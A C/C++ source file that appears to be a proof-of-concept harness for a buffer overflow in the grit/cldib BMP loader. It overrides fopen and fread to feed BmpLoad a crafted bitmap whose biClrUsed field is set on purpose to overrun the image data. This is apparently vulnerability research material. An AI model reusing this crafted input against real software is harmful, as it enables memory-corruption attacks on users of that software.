#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include <cldib.h>
#include <grit.h>


#ifdef __APPLE__
# define SECRET_GLOBAL      __attribute__((section("__DATA,__secret")))
# define SECRET_GLOBAL_RO   __attribute__((section("__TEXT,__secret")))
#else
# define SECRET_GLOBAL      __attribute__((section(".data.secret")))
# define SECRET_GLOBAL_RO   __attribute__((section(".rodata.secret")))
#endif

static BITMAPFILEHEADER bmp_file_header SECRET_GLOBAL = {
    .bfType = 0x4d42,
    .bfSize = 0x36 + 0x30,
    .bfReserved1 = 0,
    .bfReserved2 = 0,
    .bfOffBits = 0x36,
};

static BITMAPINFOHEADER bmp_info_header SECRET_GLOBAL = {
    .biSize = sizeof(BITMAPINFOHEADER),
    .biWidth = 4,
    .biHeight = 4,
    .biPlanes = 1,
    .biBitCount = 24,
    .biCompression = BI_RGB,
    .biSizeImage = 0x30,
    .biXPelsPerMeter = 2835,
    .biYPelsPerMeter = 2835,
    // Should be zero, but we set this so that biClrUsed * 4 (sizeof(RGBQUAD))
    // exceeds the size of the image data, causing a buffer overflow.
    .biClrUsed = 0x10,
    .biClrImportant = 0,
};

const size_t IMAGE_DATA_LEN = 0x80;
static uint8_t bmp_image_data[IMAGE_DATA_LEN] SECRET_GLOBAL = {
    // Doesn't matter - we care only about the length, which must be at least
    // 0x3c.
    0
};


#define TRACE(...)  ((void)0)
//#define TRACE(...)  printf(__VA_ARGS__)


extern "C" {
    struct my_file {
        size_t offset = 0;
    };

    FILE* fopen(const char* path, const char* mode) {
        if (strcmp(path, "fromager.bmp") != 0 || strcmp(mode, "rb") != 0) {
            return NULL;
        }

        my_file* ptr = new my_file;
        return (FILE*)ptr;
    }

    int fclose(FILE* f) {
        delete (my_file*)f;
        return 0;
    }

    size_t fread(void* ptr, size_t size, size_t count, FILE* fp) {
        my_file* fp2 = (my_file*)fp;

        // First read: load a BITMAPFILEHEADER
        const size_t POS0 = 0;
        if (fp2->offset == POS0 && size == sizeof(BITMAPFILEHEADER) && count == 1) {
            TRACE("first read\n");
            BITMAPFILEHEADER* bfh = (BITMAPFILEHEADER*)ptr;
            bfh->bfType = bmp_file_header.bfType;
            bfh->bfSize = bmp_file_header.bfSize;
            bfh->bfReserved1 = bmp_file_header.bfReserved1;
            bfh->bfReserved2 = bmp_file_header.bfReserved2;
            bfh->bfOffBits = bmp_file_header.bfOffBits;
            fp2->offset += sizeof(BITMAPFILEHEADER);
            return count;
        }

        // Second read: fill in the `biSize` field of a `BITMAPINFOHEADER`
        const size_t POS1 = POS0 + sizeof(BITMAPFILEHEADER);
        if (fp2->offset == POS1 && size == 4 && count == 1) {
            TRACE("second read\n");
            BITMAPINFOHEADER* bih = (BITMAPINFOHEADER*)ptr;
            // biSize must always be sizeof(BITMAPINFOHEADER) to ensure
            // CBmpFile::Load doesn't enter the "v2.x BMP" branch.
            bih->biSize = sizeof(BITMAPINFOHEADER);
            // We actually fill in the entire header here, since we have the
            // pointer handy.  (In the next read, `ptr` points to the second
            // field of the header, not the start.)
            bih->biWidth = bmp_info_header.biWidth;
            bih->biHeight = bmp_info_header.biHeight;
            bih->biPlanes = bmp_info_header.biPlanes;
            bih->biBitCount = bmp_info_header.biBitCount;
            bih->biCompression = bmp_info_header.biCompression;
            bih->biSizeImage = bmp_info_header.biSizeImage;
            bih->biXPelsPerMeter = bmp_info_header.biXPelsPerMeter;
            bih->biYPelsPerMeter = bmp_info_header.biYPelsPerMeter;
            bih->biClrUsed = bmp_info_header.biClrUsed;
            bih->biClrImportant = bmp_info_header.biClrImportant;
            fp2->offset += 4;
            return count;
        }

        // Third read: fill in the rest of the `BITMAPINFOHEADER`
        const size_t POS2 = POS1 + 4;
        if (fp2->offset == POS2 && size == sizeof(BITMAPINFOHEADER) - 4 && count == 1) {
            TRACE("third read\n");
            // No-op.  The header was already filled in during the second read.
            fp2->offset += sizeof(BITMAPINFOHEADER) - 4;
            return count;
        }

        // All subsequent reads operate normally. up to the end of
        // `bmp_image_data`.
        size_t max_count = (IMAGE_DATA_LEN - fp2->offset) / size;
        TRACE("byte read: %d (max %d) x %d at %d\n", (int)count, (int)max_count, (int)size, (int)fp2->offset);
        if (count > max_count) {
            count = max_count;
        }
        memcpy(ptr, &bmp_image_data[fp2->offset], count * size);
        fp2->offset += count * size;
        return count;
    }
}


int main() {
    CLDIB* dib = BmpLoad("fromager.bmp");
    dib_free(dib);
    return 0;
}
